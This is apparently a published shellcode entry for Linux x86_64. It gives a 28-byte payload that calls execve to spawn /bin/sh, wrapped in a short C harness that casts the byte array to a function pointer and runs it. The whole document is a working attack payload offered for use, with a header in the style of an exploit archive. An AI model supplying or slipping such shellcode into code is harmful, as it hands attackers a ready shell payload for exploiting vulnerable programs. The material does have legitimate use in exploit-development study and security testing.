/*
# Exploit Title: Linux/x64 Polymopheric_shorterversion_of_execvestack Shellcode
# Author: Lokavya PolamReddy
# Date: 2026-05-24
# Platform: Linux x86_64
# Shellcode Length: 28 bytes
# Tested on: Kali Linux
# CVE: N/A
*/
#include <stdio.h>
#include <string.h>

unsigned char code[] =\
"\x31\xc0\x50\x49\xba\x2f\x62\x69\x6e\x2f\x73\x68\x00\x41\x52\x54\x5f\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x0f\x05";

int  main()
{
    printf("Shellcode length: %d\n", sizeof(code)-1);

    int (*ret)() = (int(*)())code;
    ret();
   return 0;

}
